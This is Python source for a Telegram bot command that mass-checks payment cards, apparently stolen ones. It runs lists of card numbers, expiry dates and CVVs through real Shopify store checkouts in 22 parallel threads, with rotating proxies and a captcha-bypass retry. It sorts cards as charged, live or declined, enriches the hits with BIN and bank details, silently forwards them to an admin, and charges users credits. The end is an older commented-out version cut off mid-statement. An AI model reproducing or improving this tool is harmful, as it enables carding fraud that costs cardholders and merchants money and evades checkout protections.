"""
Professional Mass Shopify Checker with Site Rotation
Handles /msh command with intelligent site rotation on captcha/errors.
"""

import re
import time
import asyncio
import math
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.enums import ChatType, ParseMode
from BOT.Charge.Shopify.slf.api import autoshopify, autoshopify_with_captcha_retry
from BOT.Charge.Shopify.tls_session import TLSAsyncSession
from BOT.Charge.Shopify.bulletproof_session import BulletproofSession
from BOT.Charge.Shopify.slf.site_manager import SiteRotator, get_user_sites
from BOT.Charge.Shopify.slf.single import (
    check_card_all_sites_parallel,
    SH_CONCURRENT_THREADS,
    MASS_DELAY_BETWEEN_CARDS,
)
from BOT.helper.start import load_users
from BOT.helper.error_files import clear_error_file, save_error_ccs, generate_check_id, get_error_file_path
from BOT.tools.proxy import get_rotating_proxy
from BOT.helper.permissions import check_private_access
from BOT.gc.credit import deduct_credit_bulk
from BOT.helper.safe_edit import safe_edit_with_throttle
from BOT.helper.admin_forward import forward_success_card_to_admin

# Try to import BIN lookup
try:
    from TOOLS.getbin import get_bin_details
except ImportError:
    def get_bin_details(bin_number):
        return None

user_locks = {}
msh_stop_requested: dict[str, bool] = {}
MAX_SITE_RETRIES = 3
SPINNERS = ("◐", "◓", "◑", "◒")

def chunk_cards(cards, size):
    for i in range(0, len(cards), size):
        yield cards[i:i + size]

def get_status_flag(raw_response):
    """
    Determine status flag from response.
    
    Categories:
    - Charged 💎: Payment completed successfully
    - Approved ✅: Card is live, CVV/Address issue (CCN)
    - Declined ❌: Card is dead/blocked/expired
    - Error ⚠️: System/Site errors
    """
    response_upper = str(raw_response).upper() if raw_response else ""
    
    # Check for system errors first
    if any(error_keyword in response_upper for error_keyword in [
        # Captcha/Bot detection
        "CAPTCHA", "HCAPTCHA", "RECAPTCHA", "CHALLENGE", "VERIFY",
        # Site errors
        "SITE_EMPTY", "SITE_HTML", "SITE_CAPTCHA", "SITE_HTTP", "SITE_CONNECTION",
        "SITE_NO_PRODUCTS", "SITE_PRODUCTS_EMPTY", "SITE_INVALID_JSON", "SITE_EMPTY_JSON",
        # Cart/Session errors
        "CART_ERROR", "CART_HTML", "CART_INVALID", "CART_CREATION",
        "SESSION_ERROR", "SESSION_ID", "SESSION_INVALID",
        # Other system errors
        "CONNECTION FAILED", "IP RATE LIMIT", "PRODUCT ID", "SITE NOT FOUND",
        "REQUEST TIMEOUT", "REQUEST FAILED", "SITE | CARD ERROR",
        "ERROR", "BLOCKED", "PROXY", "TIMEOUT", "DEAD", "EMPTY",
        "NO_AVAILABLE_PRODUCTS", "BUILD", "TAX", "DELIVERY"
    ]):
        return "Error ⚠️"
    
    # Charged - Payment completed
    elif any(keyword in response_upper for keyword in [
        "ORDER_PLACED", "THANK YOU", "SUCCESS", "CHARGED", "COMPLETE"
    ]):
        return "Charged 💎"
    
    # Approved/CCN - Card is valid, CVV/Address issue
    elif any(keyword in response_upper for keyword in [
        "3D CC", "3DS", "3D_SECURE", "AUTHENTICATION_REQUIRED",
        "MISMATCHED_BILLING", "MISMATCHED_PIN", "MISMATCHED_ZIP", "MISMATCHED_BILL",
        "INCORRECT_CVC", "INVALID_CVC", "CVV_MISMATCH",
        "INCORRECT_ZIP", "INCORRECT_ADDRESS", "INCORRECT_PIN",
        "INSUFFICIENT_FUNDS"  # Card is valid but no funds
    ]):
        return "Approved ✅"
    
    # Declined - Card is dead/blocked/expired
    elif any(keyword in response_upper for keyword in [
        "CARD_DECLINED", "DECLINED", "GENERIC_DECLINE", "DO_NOT_HONOR",
        "INVALID_ACCOUNT", "EXPIRED", "CARD_NOT_SUPPORTED", "TRY_AGAIN",
        "PROCESSING_ERROR", "PICKUP", "LOST", "STOLEN", "FRAUD",
        "RESTRICTED", "REVOKED", "INVALID_NUMBER", "NO_SUCH_CARD"
    ]):
        return "Declined ❌"
    
    else:
        return "Declined ❌"


def _log_check_to_terminal_mass(gate: str, res: dict, fullcc: str) -> None:
    """Print one check result to terminal (Gateway, Price, ReceiptId, Response, Status, cc) - for mass checks."""
    r = res or {}
    gate_raw = r.get("Gateway") or gate or "Unknown"
    gate_display = "Shopify Normal" if (not gate_raw or gate_raw == "Unknown" or gate_raw == "Normal") else (gate_raw if "Shopify" in str(gate_raw) else f"Shopify {gate_raw}")
    if "$" in str(gate_display):
        gate_display = re.sub(r"\s*\$\s*[\d.]+\s*$", "", str(gate_display)).strip() or "Shopify Normal"
    price = r.get("Price", "0.00")
    rid = r.get("ReceiptId")
    resp = r.get("Response", "UNKNOWN")
    status = r.get("Status", False)
    cc = r.get("cc", fullcc)
    lines = [f"Gateway: {gate_display}", f"Price: {price}"]
    if rid:
        lines.append(f"ReceiptId: {rid}")
    lines.append(f"Response: {resp} Status: {str(status).lower()}")
    if cc:
        lines.append(f"cc: {cc}")
    print("\n".join(lines))
    print()


def format_mass_result(card: str, raw_response: str, gateway: str = "Shopify") -> str:
    """Format a single card result for mass check with BIN info."""
    from TOOLS.getbin import get_bin_details
    
    status_flag = get_status_flag((raw_response or "").upper())
    cc = card.split("|")[0] if "|" in card else card
    
    # Get BIN info
    try:
        bin_data = get_bin_details(cc[:6])
        if bin_data:
            bin_info = f"{bin_data.get('vendor', 'N/A')} - {bin_data.get('type', 'N/A')}"
            country = f"{bin_data.get('country', 'N/A')} {bin_data.get('flag', '')}"
        else:
            bin_info = "N/A"
            country = "N/A"
    except:
        bin_info = "N/A"
        country = "N/A"
    
    return (
        f"<b>[•] Card:</b> <code>{card}</code>\n"
        f"<b>[•] Status:</b> <code>{status_flag}</code>\n"
        f"<b>[•] Response:</b> <code>{raw_response or '-'}</code>\n"
        f"<b>[+] BIN:</b> <code>{cc[:6]}</code> | <code>{bin_info}</code> | <code>{country}</code>\n"
        "━ ━ ━ ━ ━ ━━━ ━ ━ ━ ━ ━"
    )

def extract_cards(text):
    return re.findall(r'(\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', text)

import json

def load_sites():
    with open("DATA/sites.json", "r") as f:
        return json.load(f)


async def check_card_with_rotation(user_id: str, card: str, proxy: str = None) -> tuple:
    """
    Check a card with site rotation on captcha/errors.
    Returns (response, site_url, retries)
    """
    rotator = SiteRotator(user_id, max_retries=MAX_SITE_RETRIES)
    
    if not rotator.has_sites():
        return "NO_SITES_CONFIGURED", None, 0
    
    retry_count = 0
    last_response = "UNKNOWN"
    last_site = None
    
    while retry_count < MAX_SITE_RETRIES:
        current_site = rotator.get_current_site()
        if not current_site:
            break
        
        site_url = current_site.get("url")
        last_site = site_url
        
        try:
            async with BulletproofSession(timeout_seconds=75, proxy=proxy, use_playwright=False) as session:
                # Use captcha-aware wrapper with 3 internal retries
                result = await autoshopify_with_captcha_retry(site_url, card, session, max_captcha_retries=3)
            
            response = str(result.get("Response", "UNKNOWN"))
            last_response = response
            
            # Check if this is a real response
            if rotator.is_real_response(response):
                rotator.mark_current_success()
                return response, site_url, retry_count
            
            # Check if we should retry with another site
            if rotator.should_retry(response):
                retry_count += 1
                rotator.mark_current_failed()
                next_site = rotator.get_next_site()
                if not next_site:
                    break
                await asyncio.sleep(0.15)  # Railway-safe delay
                continue
            else:
                return response, site_url, retry_count
                
        except Exception as e:
            last_response = f"ERROR: {str(e)[:40]}"
            retry_count += 1
            next_site = rotator.get_next_site()
            if not next_site:
                break
    
    return last_response, last_site, retry_count


@Client.on_message(filters.command("msh") | filters.regex(r"^\.mslf(\s|$)"))
async def mslf_handler(client, message):
    user_id = str(message.from_user.id)

    if not message.from_user:
        return await message.reply("❌ Cannot process this message. Comes From Channel")

    if user_id in user_locks:
        return await message.reply(
            "<pre>⚠️ Wait!</pre>\n"
            "<b>Your previous</b> <code>/msh</code> <b>request is still processing.</b>\n"
            "<b>Please wait until it finishes.</b>", reply_to_message_id=message.id
        )

    user_locks[user_id] = True

    try:
        users = load_users()

        if user_id not in users:
            return await message.reply(
                "<pre>Access Denied 🚫</pre>\n"
                "<b>You have to register first using</b> <code>/register</code> <b>command.</b>",
                reply_to_message_id=message.id
            )

        if not await check_private_access(message):
            return

        proxy = get_rotating_proxy(str(user_id))
        if not proxy:
            return await message.reply(
                "<pre>Proxy Error ❗️</pre>\n"
                "<b>~ Message :</b> <code>You Have To Add Proxy For Mass checking</code>\n"
                "<b>~ Command  →</b> <b>/setpx</b>\n",
                reply_to_message_id=message.id
            )
        
        # Check if user has sites
        user_sites = get_user_sites(user_id)
        if not user_sites:
            return await message.reply(
                "<pre>Site Not Found ⚠️</pre>\n"
                "Error : <code>Please Set Site First</code>\n"
                "~ <code>Using /addurl or /txturl</code>",
                reply_to_message_id=message.id
            )
        
        user_data = users[user_id]
        plan_info = user_data.get("plan", {})
        mlimit = plan_info.get("mlimit")
        plan = plan_info.get("plan", "Free")
        badge = plan_info.get("badge", "🎟️")

        # VIP plan has unlimited mass limit
        is_vip = plan == "VIP"
        
        if is_vip:
            mlimit = None  # Unlimited for VIP
        elif mlimit is None or str(mlimit).lower() in ["null", "none"]:
            mlimit = 10_000
        else:
            mlimit = int(mlimit)

        gateway = user_sites[0].get("gateway", "Shopify")
        site_count = len(user_sites)

        target_text = None
        if message.reply_to_message and message.reply_to_message.text:
            target_text = message.reply_to_message.text
        elif len(message.text.split(maxsplit=1)) > 1:
            target_text = message.text.split(maxsplit=1)[1]

        if not target_text:
            return await message.reply(
                "❌ Send cards!\n1 per line:\n4633438786747757|10|2025|298",
                reply_to_message_id=message.id
            )

        all_cards = extract_cards(target_text)
        if not all_cards:
            return await message.reply("❌ No valid cards found!", reply_to_message_id=message.id)

        # VIP has unlimited, other plans check limit
        if not is_vip and mlimit and len(all_cards) > mlimit:
            return await message.reply(
                f"❌ You can check max {mlimit} cards as per your plan!",
                reply_to_message_id=message.id
            )

        available_credits = user_data.get("plan", {}).get("credits", 0)
        card_count = len(all_cards)

        if available_credits != "∞":
            try:
                available_credits = int(available_credits)
                if card_count > available_credits:
                    return await message.reply(
                        "<pre>Notification ❗️</pre>\n"
                        "<b>Message :</b> <code>You Have Insufficient Credits</code>\n"
                        "<b>Get Credits To Use</b>\n"
                        "━━━━━━━━━━━━━\n"
                        "<b>Type <code>/buy</code> to get Credits.</b>",
                        reply_to_message_id=message.id
                    )
            except Exception:
                return await message.reply(
                    "⚠️ Error reading your credit balance.",
                    reply_to_message_id=message.id
                )

        checked_by = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"

        msh_stop_requested[user_id] = False
        stop_kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("⏹ Stop Checking", callback_data=f"msh_stop_{user_id}")],
        ])

        had_previous = get_error_file_path(user_id, "shopify") is not None
        clear_error_file(user_id, "shopify")
        check_id = generate_check_id()
        error_ccs = []
        cleaning_note = "\n<b>📎 Previous error file cleared.</b>" if had_previous else ""

        loader_msg = await message.reply(
            f"""<pre>◐ [#MSH] | Mass Shopify Check</pre>
━━━━━━━━━━━━━━━
<b>[⚬] Check ID:</b> <code>{check_id}</code>
<b>[⚬] Gateway:</b> <code>{gateway}</code>
<b>[⚬] Cards:</b> <code>{card_count}</code>
<b>[⚬] Sites:</b> <code>{site_count}</code>
<b>[⚬] Mode:</b> <code>Parallel (22 threads) ⚡</code>
<b>[⚬] Status:</b> <code>◐ Processing...</code>{cleaning_note}
━━━━━━━━━━━━━
<b>[⚬] Checked By:</b> {checked_by} [<code>{plan} {badge}</code>]""",
            reply_to_message_id=message.id,
            parse_mode=ParseMode.HTML,
            reply_markup=stop_kb,
        )

        # start_time = time.time()
        # final_results = []

        # product_id_count = 0
        # rate_limit_count = 0

        # for idx, fullcc in enumerate(all_cards, start=1):
        #     # Use your check_card API directly (pass user_id, card)
        #     raw_response = await check_card(user_id, fullcc)

        #     if "ip rate limit" in raw_response.lower():
        #         rate_limit_count += 1
        #         if rate_limit_count >= 2:
        #             await message.reply(
        #                 "<pre>🚫 M-Self Shopify Aborted</pre>\n",
        #                 "<b>Reason :</b> <code>Site Got Rate Limit</code>\n",
        #                 "<b>Note :</b> <code>Add Another URL Using /adddurl</code>",
        #                 disable_web_page_preview=True,
        #                 reply_to_message_id=message.id
        #             )
        #             break

        #     if "product id" in raw_response.lower():
        #         product_id_count += 1
        #         if product_id_count >= 2:
        #             await message.reply(
        #                 "<pre>🚫 M-Self Shopify Aborted</pre>\n",
        #                 "<b>Reason : Site Got Rate Limit\n",
        #                 "<b>Action :</b> <code>Add Another URL Using /adddurl</code>\n",
        #                 disable_web_page_preview=True,
        #                 reply_to_message_id=message.id
        #             )
        #             break

        #     status_flag = get_status_flag(raw_response.upper())

        #     final_results.append(
        #         f"• <b>Card :</b> <code>{fullcc}</code>\n"
        #         f"• <b>Status :</b> <code>{status_flag}</code>\n"
        #         f"• <b>Result :</b> <code>{raw_response or '-'}</code>\n"
        #         "━ ━ ━ ━ ━ ━━━ ━ ━ ━ ━ ━"
        #     )

        #     # Edit after every card
        #     await loader_msg.edit(
        #         f"<pre>✦ [$mslf] | M-Self Shopify</pre>\n"
        #         + "\n".join(final_results) + "\n"
        #         f"<b>[⚬] Checked By :</b> {checked_by} [<code>{plan} {badge}</code>]\n"
        #         f"<b>[⚬] Dev :</b> <a href='https://t.me/Chr1shtopher'>Christopher�</a>",
        #         disable_web_page_preview=True
        #     )

        # end_time = time.time()
        # timetaken = round(end_time - start_time, 2)

        # # Deduct credits after processing
        # if user_data["plan"].get("credits") != "∞":
        #     loop = asyncio.get_event_loop()
        #     await loop.run_in_executor(None, deduct_credit_bulk, user_id, card_count)

        # final_result_text = "\n".join(final_results)

        # await loader_msg.edit(
        #     f"<pre>✦ [$mslf] | M-Self Shopify</pre>\n"
        #     f"{final_result_text}\n"
        #     f"<b>[⚬] T/t :</b> <code>{timetaken}s</code>\n"
        #     f"<b>[⚬] Checked By :</b> {checked_by} [<code>{plan} {badge}</code>]\n"
        #     f"<b>[⚬] Dev :</b> <a href='https://t.me/Chr1shtopher'>Christopher�</a>",
        #     disable_web_page_preview=True
        # )

        start_time = time.time()
        total_cc = len(all_cards)
        last_progress_edit = 0.0
        PROGRESS_THROTTLE = 0.25  # Faster updates for responsive UI (100 threads)
        approved_count = 0
        declined_count = 0
        charged_count = 0
        captcha_count = 0
        error_count = 0
        processed_count = 0
        total_retries = 0
        stopped = False

        # Professional multi-threading: 22 threads with semaphore (Railway-optimized)
        MSH_CONCURRENCY = 22
        msh_semaphore = asyncio.Semaphore(MSH_CONCURRENCY)
        progress_lock = asyncio.Lock()
        
        # Card result tracking: first real response wins, stop all other processing for that card
        card_results = {}  # {card: (response, result, retries)} - tracks completed cards
        card_locks = {}  # {card: asyncio.Lock()} - prevents duplicate processing

        async def _edit_progress(force: bool = False):
            nonlocal last_progress_edit
            async with progress_lock:
                now = time.time()
                if not force and (now - last_progress_edit) < PROGRESS_THROTTLE:
                    return
                elapsed = now - start_time
                rate = (processed_count / elapsed) if elapsed > 0 else 0
                sp = SPINNERS[int(now) % 4]  # Rotate every 1 second
                progress_text = f"""<pre>{sp} [#MSH] | Mass Shopify Check</pre>
━━━━━━━━━━━━━━━
<b>[⚬] Check ID:</b> <code>{check_id}</code>
<b>🟢 Total CC:</b> <code>{total_cc}</code>
<b>💬 Progress:</b> <code>{processed_count}/{total_cc}</code>
<b>✅ Approved:</b> <code>{approved_count}</code>
<b>💎 Charged:</b> <code>{charged_count}</code>
<b>❌ Declined:</b> <code>{declined_count}</code>
<b>⚠️ Errors:</b> <code>{error_count}</code>
<b>🔄 Rotations:</b> <code>{total_retries}</code>
<b>⏱️ Time:</b> <code>{elapsed:.1f}s</code> · <code>{rate:.1f} cc/s</code>
<b>⚡ Threads:</b> <code>22</code>
<b>👤 Checked By:</b> {checked_by} [<code>{plan} {badge}</code>]"""
                
                success, new_time = await safe_edit_with_throttle(
                    client=client,
                    message=loader_msg,
                    text=progress_text,
                    last_edit_time=last_progress_edit,
                    throttle_seconds=PROGRESS_THROTTLE,
                    reply_markup=stop_kb,
                    parse_mode=ParseMode.HTML,
                    disable_web_page_preview=True,
                    force=force
                )
                if success:
                    last_progress_edit = new_time

        async def check_one(card):
            """Professional check with 22-thread parallel processing - Railway-optimized with early termination."""
            # Check if this card already has a real response (early termination)
            if card in card_results:
                return card, card_results[card][0], card_results[card][2], card_results[card][1]
            
            # Get or create lock for this card
            if card not in card_locks:
                card_locks[card] = asyncio.Lock()
            
            async with card_locks[card]:
                # Double-check after acquiring lock (another thread might have completed it)
                if card in card_results:
                    return card, card_results[card][0], card_results[card][2], card_results[card][1]
                
                async with msh_semaphore:  # Limit to 22 concurrent checks
                    try:
                        # Get fresh proxy for each card (rotation)
                        current_proxy = get_rotating_proxy(str(user_id))
                        if not current_proxy:
                            result = (card, "NO_PROXY", 0, None)
                            card_results[card] = ("NO_PROXY", None, 0)
                            return result
                        
                        # Get ALL active sites for rotation
                        active_sites = [s for s in user_sites if s.get("active", True)]
                        if not active_sites:
                            result = (card, "NO_ACTIVE_SITES", 0, None)
                            card_results[card] = ("NO_ACTIVE_SITES", None, 0)
                            return result
                        
                        # Use all saved sites with proper rotation
                        rotator = SiteRotator(user_id, max_retries=MAX_SITE_RETRIES)  # Use all sites
                        retry_count = 0
                        last_response = "UNKNOWN"
                        last_result = None
                        
                        while retry_count < MAX_SITE_RETRIES:  # Use all saved sites properly
                            # Check again if card was completed by another thread
                            if card in card_results:
                                return card, card_results[card][0], card_results[card][2], card_results[card][1]
                            
                            current_site = rotator.get_current_site()
                            if not current_site:
                                break
                            
                            site_url = current_site.get("url")
                            
                            try:
                                # Rotate proxy on retry
                                if retry_count > 0:
                                    current_proxy = get_rotating_proxy(str(user_id))
                                
                                # Professional check with captcha bypass
                                async with BulletproofSession(timeout_seconds=60, proxy=current_proxy, use_playwright=False) as session:
                                    result = await autoshopify_with_captcha_retry(
                                        site_url,
                                        card,
                                        session,
                                        max_captcha_retries=2,  # Reduced for speed
                                        proxy=current_proxy
                                    )
                                
                                response = str(result.get("Response", "UNKNOWN"))
                                last_response = response
                                last_result = result
                                
                                # Check if real response - FIRST REAL RESPONSE WINS
                                if rotator.is_real_response(response):
                                    rotator.mark_current_success()
                                    # Store result and stop processing this card
                                    card_results[card] = (response, result, retry_count)
                                    return card, response, retry_count, result
                                
                                # Check if should retry
                                if rotator.should_retry(response) and retry_count < MAX_SITE_RETRIES - 1:
                                    retry_count += 1
                                    rotator.mark_current_failed()
                                    next_site = rotator.get_next_site()
                                    if not next_site:
                                        break
                                    await asyncio.sleep(0.1)  # Railway-safe delay
                                    continue
                                else:
                                    # Not a retry case, but also not a real response - store and return
                                    if not rotator.is_real_response(response):
                                        card_results[card] = (response, result, retry_count)
                                    return card, response, retry_count, result
                                    
                            except Exception as e:
                                last_response = f"ERROR: {str(e)[:30]}"
                                retry_count += 1
                                next_site = rotator.get_next_site()
                                if not next_site:
                                    break
                                await asyncio.sleep(0.05)
                        
                        # Return last result or error
                        if last_result:
                            final_response = str(last_result.get("Response", last_response))
                            card_results[card] = (final_response, last_result, retry_count)
                            return card, final_response, retry_count, last_result
                        card_results[card] = (last_response, None, retry_count)
                        return card, last_response, retry_count, None
                        
                    except Exception as e:
                        error_response = f"ERROR: {str(e)[:40]}"
                        card_results[card] = (error_response, None, 0)
                        return card, error_response, 0, None

        # Create all tasks for parallel processing (100 threads, Railway-optimized)
        tasks = [check_one(card) for card in all_cards]
        
        # Process results as they complete (professional parallel processing)
        for task_coro in asyncio.as_completed(tasks):
            if msh_stop_requested.get(user_id):
                stopped = True
                # Cancel remaining tasks
                for t in tasks:
                    if not t.done():
                        t.cancel()
                break
            
            try:
                card_used, raw_response, retries, result = await task_coro
            except Exception as e:
                card_used = "UNKNOWN"
                raw_response = f"ERROR: {str(e)[:40]}"
                retries = 0
                result = None
            
            async with progress_lock:
                processed_count += 1
                total_retries += retries

            # Log ALL responses to terminal (same format as /sh)
            if result:
                result["cc"] = card_used
                _log_check_to_terminal_mass("Shopify", result, card_used)
            else:
                # Create minimal result dict for logging
                log_result = {
                    "Response": raw_response,
                    "Status": False,
                    "Gateway": "Shopify",
                    "Price": "0.00",
                    "cc": card_used
                }
                _log_check_to_terminal_mass("Shopify", log_result, card_used)

            status_flag = get_status_flag((raw_response or "").upper())
            response_upper = (raw_response or "").upper()
            is_charged = "Charged 💎" in status_flag
            is_approved = "Approved ✅" in status_flag
            is_error = "Error ⚠️" in status_flag
            is_captcha = any(x in response_upper for x in ["CAPTCHA", "RECAPTCHA", "CHALLENGE", "HCAPTCHA"])
            
            async with progress_lock:
                if is_charged:
                    charged_count += 1
                elif is_approved:
                    approved_count += 1
                elif is_error:
                    error_count += 1
                    error_ccs.append(card_used)
                else:
                    declined_count += 1
                if is_captcha:
                    captcha_count += 1
                    if card_used not in error_ccs:
                        error_ccs.append(card_used)

            if is_charged or is_approved:
                cc_num = card_used.split("|")[0] if "|" in card_used else card_used
                try:
                    bin_data = get_bin_details(cc_num[:6])
                    if bin_data:
                        bin_info = f"{bin_data.get('vendor', 'N/A')} - {bin_data.get('type', 'N/A')} - {bin_data.get('level', 'N/A')}"
                        bank = bin_data.get('bank', 'N/A')
                        country = f"{bin_data.get('country', 'N/A')} {bin_data.get('flag', '')}"
                    else:
                        bin_info = bank = country = "N/A"
                except Exception:
                    bin_info = bank = country = "N/A"
                pr = (result or {}).get("Price", "0.00")
                try:
                    pv = float(pr)
                    pr = f"{pv:.2f}" if pv != int(pv) else str(int(pv))
                except (TypeError, ValueError):
                    pr = str(pr) if pr else "0.00"
                gateway_display = f"Shopify Normal ${pr}"
                hit_header = "CHARGED" if is_charged else "CCN LIVE"
                hit_status = "Charged 💎" if is_charged else "Approved ✅"
                hit_message = f"""<b>[#Shopify] | {hit_header}</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card:</b> <code>{card_used}</code>
<b>[•] Gateway:</b> <code>{gateway_display}</code>
<b>[•] Status:</b> <code>{hit_status}</code>
<b>[•] Response:</b> <code>{raw_response}</code>
<b>[•] Retries:</b> <code>{retries}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] BIN:</b> <code>{cc_num[:6]}</code>
<b>[+] Info:</b> <code>{bin_info}</code>
<b>[+] Bank:</b> <code>{bank}</code> 🏦
<b>[+] Country:</b> <code>{country}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By:</b> {checked_by} [<code>{plan} {badge}</code>]
<b>[ϟ] Dev:</b> <a href="https://t.me/Chr1shtopher">Chr1shtopher</a>
━━━━━━━━━━━━━━━"""
                try:
                    await message.reply(hit_message, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
                except Exception:
                    pass
                
                # Forward success card to admin silently
                receipt_id = (result or {}).get("ReceiptId")
                await forward_success_card_to_admin(
                    client=client,
                    card_data=card_used,
                    status=hit_status,
                    response=raw_response,
                    gateway=gateway_display,
                    price=pr,
                    checked_by=f"{checked_by} [{plan} {badge}]",
                    bin_info=bin_info,
                    bank=bank,
                    country=country,
                    retries=retries,
                    receipt_id=receipt_id,
                    time_taken=0.0
                )
                
                await _edit_progress(force=True)

            is_last = processed_count == total_cc
            await _edit_progress(force=is_last)

        end_time = time.time()
        timetaken = round(end_time - start_time, 2)
        rate_final = (processed_count / timetaken) if timetaken > 0 else 0

        # Deduct credits: only for actually checked cards when stopped
        if user_data["plan"].get("credits") != "∞":
            loop = asyncio.get_event_loop()
            count_to_deduct = processed_count if stopped else len(all_cards)
            await loop.run_in_executor(None, deduct_credit_bulk, user_id, count_to_deduct)

        # Save error+captcha CCs for /geterrors msh (use same check_id; shopify gate)
        if error_ccs:
            save_error_ccs(user_id, "shopify", error_ccs, check_id=check_id)
        error_files_line = ""
        if error_ccs:
            error_files_line = (
                f"\n📎 <b>To get error CCs file:</b> <code>/geterrors msh</code> (Check ID: <code>{check_id}</code>)\n"
                "<b>📎 Error file stays</b> until you start a new <code>/msh</code> or <code>/tsh</code> check; then it is cleared.\n"
            )

        # Final completion response with statistics (check_id only in processing + completion)
        current_time = datetime.now().strftime("%I:%M %p")
        header = "<pre>⏹ Stopped by user</pre>" if stopped else "<pre>✦ CC Check Completed</pre>"
        completion_message = f"""{header}
━━━━━━━━━━━━━━━
<b>[⚬] Check ID:</b> <code>{check_id}</code>
🟢 <b>Total CC</b>     : <code>{total_cc}</code>
💬 <b>Progress</b>    : <code>{processed_count}/{total_cc}</code>
✅ <b>Approved</b>    : <code>{approved_count}</code>
💎 <b>Charged</b>     : <code>{charged_count}</code>
❌ <b>Declined</b>    : <code>{declined_count}</code>
⚠️ <b>Errors</b>      : <code>{error_count}</code>
⚠️ <b>CAPTCHA</b>     : <code>{captcha_count}</code>
🔄 <b>Rotations</b>   : <code>{total_retries}</code>
━━━━━━━━━━━━━
⏱️ <b>Time</b> : <code>{timetaken}s</code> · <code>{rate_final:.1f} cc/s</code>
👤 <b>Checked By</b> : {checked_by} [<code>{plan} {badge}</code>]
🔧 <b>Dev</b>: <a href="https://t.me/Chr1shtopher">Chr1shtopher</a> <code>{current_time}</code>
{error_files_line}━━━━━━━━━━━━━━━"""

        try:
            await loader_msg.edit(
                completion_message,
                parse_mode=ParseMode.HTML,
                disable_web_page_preview=True,
                reply_markup=None,
            )
        except Exception:
            pass

    except Exception as e:
        await message.reply(f"⚠️ Error: {e}", reply_to_message_id=message.id)

    finally:
        user_locks.pop(user_id, None)


@Client.on_callback_query(filters.regex(r"^msh_stop_(\d+)$"))
async def msh_stop_callback(client, cq):
    """Stop a running /msh check. Mandatory: only the user who started it can stop."""
    try:
        if not cq.from_user:
            await cq.answer("Invalid request.", show_alert=True)
            return
        uid = cq.matches[0].group(1) if cq.matches else None
        # Mandatory: only the user who started this check can stop it.
        if not uid or str(cq.from_user.id) != uid:
            await cq.answer("Only the user who started this check can stop it.", show_alert=True)
            return
        msh_stop_requested[uid] = True
        try:
            await cq.message.edit_text(
                "<pre>⏹ Stopping... Please wait.</pre>\n\n"
                "━━━━━━━━━━━━━━━\n"
                "The check will stop after the current card finishes.",
                parse_mode=ParseMode.HTML,
                reply_markup=None,
            )
        except Exception:
            pass
        await cq.answer("Stop requested. Stopping after current card…")
    except Exception:
        await cq.answer("Could not process.", show_alert=True)


# import re
# import time
# import asyncio
# from pyrogram import Client, filters
# from pyrogram.enums import ChatType
# from BOT.Charge.Shopify.slf.slf import check_card, get_site  # your actual API functions
# from BOT.helper.start import load_users
# from BOT.helper.permissions import check_private_access, load_allowed_groups, is_premium_user
# from BOT.gc.credit import deduct_credit_bulk

# user_locks = {}

# def get_status_flag(raw_response):
#     if "ORDER_PLACED" in raw_response or "THANK YOU" in raw_response:
#         return "Charged 💎"
#     elif any(keyword in raw_response for keyword in [
#         "3D CC", "MISMATCHED_BILLING", "MISMATCHED_PIN", "MISMATCHED_ZIP",
#         "INSUFFICIENT_FUNDS", "INVALID_CVC", "INCORRECT_CVC", "3DS_REQUIRED", "MISMATCHED_BILL"
#     ]):
#         return "Approved ✅"
#     else:
#         return "Declined ❌"

# def extract_cards(text):
#     return re.findall(r'(\d{12,19}\|\d{1,2}\|\d{2,4}\|\d{3,4})', text)

# import json

# def load_sites():
#     with open("DATA/sites.json", "r") as f:
#         return json.load(f)


# @Client.on_message(filters.command("msh") | filters.regex(r"^\.mslf(\s|$)"))
# async def mslf_handler(client, message):
#     user_id = str(message.from_user.id)

#     if not message.from_user:
#         return await message.reply("❌ Cannot process this message. Comes From Channel")

#     if user_id in user_locks:
#         return await message.reply(
#             "<pre>⚠️ Wait!</pre>\n"
#             "<b>Your previous</b> <code>/mslf</code> <b>request is still processing.</b>\n"
#             "<b>Please wait until it finishes.</b>", reply_to_message_id=message.id
#         )

#     user_locks[user_id] = True

#     try:
#         users = load_users()

#         if user_id not in users:
#             return await message.reply(
#                 "<pre>Access Denied 🚫</pre>\n"
#                 "<b>You have to register first using</b> <code>/register</code> <b>command.</b>",
#                 reply_to_message_id=message.id
#             )

#         allowed_groups = load_allowed_groups()

#         if message.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP] and message.chat.id not in allowed_groups:
#             return await message.reply(
#                 "<pre>Notification ❗️</pre>\n"
#                 "<b>~ Message :</b> <code>This Group Is Not Approved ⚠️</code>\n"
#                 "<b>~ Contact  →</b> <b>@Chr1shtopher</b>\n"
#                 "━━━━━━━━━━━━━\n"
#                 "<b>Contact Owner For Approving</b>",
#                 reply_to_message_id=message.id
#             )

#         if not await is_premium_user(message):
#             return

#         if not await check_private_access(message):
#             return

#         user_data = users[user_id]
#         plan_info = user_data.get("plan", {})
#         mlimit = plan_info.get("mlimit")
#         plan = plan_info.get("plan", "Free")
#         badge = plan_info.get("badge", "🎟️")

#         # Default unlimited if None
#         if mlimit is None or str(mlimit).lower() in ["null", "none"]:
#             mlimit = 10_000
#         else:
#             mlimit = int(mlimit)

#         sites = load_sites()
#         if user_id not in sites:
#             await message.reply(
#                 "<pre>Site Not Found ⚠️</pre>\n"
#                 "Error : <code>Please Set Site First</code>\n"
#                 "~ <code>Using /slfurl in Bot's Private</code>",
#                 reply_to_message_id=message.id
#             )
#             return

#         user_site_info = sites[user_id]
#         site = user_site_info["site"]
#         gateway = user_site_info["gate"]

#         target_text = None
#         if message.reply_to_message and message.reply_to_message.text:
#             target_text = message.reply_to_message.text
#         elif len(message.text.split(maxsplit=1)) > 1:
#             target_text = message.text.split(maxsplit=1)[1]

#         if not target_text:
#             return await message.reply(
#                 "❌ Send cards!\n1 per line:\n4633438786747757|10|2025|298",
#                 reply_to_message_id=message.id
#             )

#         all_cards = extract_cards(target_text)
#         if not all_cards:
#             return await message.reply("❌ No valid cards found!", reply_to_message_id=message.id)

#         if len(all_cards) > mlimit:
#             return await message.reply(
